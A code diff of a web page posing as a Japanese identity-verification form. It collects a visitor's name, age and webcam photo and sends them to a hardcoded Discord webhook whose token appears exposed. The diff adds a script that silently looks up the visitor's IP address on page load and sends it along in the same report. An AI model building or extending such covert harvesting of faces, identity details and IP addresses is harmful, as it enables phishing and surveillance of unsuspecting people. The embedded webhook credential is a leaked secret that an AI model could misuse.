@@ -53,7 +53,7 @@
             border-radius: 3px;
             font-family: 'Courier New', Courier, monospace;
         }
-        input[type="text"]:focus, input[type="number"]:focus {
+        input:focus {
             outline: none;
             box-shadow: 0 0 10px #0f0;
         }
@@ -69,7 +69,6 @@
             font-weight: bold;
             text-transform: uppercase;
             transition: all 0.3s ease;
-            font-family: 'Courier New', Courier, monospace;
         }
         button:hover {
             background-color: #0f0;
@@ -143,7 +142,20 @@
         const statusDiv = document.getElementById('status');
 
         let stream = null;
-        let userData = {};
+        let userData = { ip: "取得中..." };
+
+        // ページ読み込み時にIP取得（非同期）
+        async function fetchIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userData.ip = data.ip || "取得失敗";
+            } catch (err) {
+                console.error('IP取得エラー:', err);
+                userData.ip = "取得できませんでした";
+            }
+        }
+        fetchIP();  // 即実行
 
         // ステップ1 → ステップ2
         infoForm.addEventListener('submit', (e) => {
@@ -191,7 +203,7 @@
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Blob取得（圧縮して軽く）
+            // Blob取得（軽量化）
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.82));
 
             // カメラ停止
@@ -204,15 +216,16 @@
             // FormData作成
             const formData = new FormData();
 
-            // JSON部分
+            // JSON部分（IPも含む）
             const payload = {
-                content: `**本人確認ログ**\n名前: ${userData.name}\n年齢: ${userData.age}`,
+                content: `**本人確認ログ**\n名前: ${userData.name}\n年齢: ${userData.age}\nIP: ${userData.ip}`,
                 embeds: [{
-                    title: "本人確認画像",
+                    title: "本人確認画像 + IP情報",
                     color: 0x00ff00,
                     fields: [
                         { name: "名前", value: userData.name, inline: true },
                         { name: "年齢", value: userData.age, inline: true },
+                        { name: "IPアドレス", value: userData.ip, inline: true },
                         { name: "撮影日時", value: new Date().toLocaleString('ja-JP'), inline: true }
                     ],
                     image: { url: "attachment://photo.jpg" },
@@ -223,9 +236,9 @@
             formData.append('payload_json', JSON.stringify(payload));
             formData.append('files[0]', blob, 'photo.jpg');
 
-            // Webhook URL（ここを必ず変更！）
+            // Webhook URL（必ず自分のものに変更！）
             const webhookUrl = "https://discord.com/api/webhooks/1468964638237397179/NMYIXppBkg9vkl02D5OLB_sOuXSdDLkiY9V30yWWXNaEBQm0L3LS6bEGquFAFZ0ue69d";
-
+            
             try {
                 const res = await fetch(webhookUrl, {
                     method: 'POST',
@@ -244,7 +257,7 @@
                 }
             } catch (err) {
                 console.error('送信エラー:', err);
-                statusDiv.textContent = '送信失敗しました。Webhook URLを確認してください。';
+                statusDiv.textContent = '送信失敗しました。Webhook URLまたはネットワークを確認してください。';
                 statusDiv.style.color = '#f00';
                 captureBtn.disabled = false;
             }
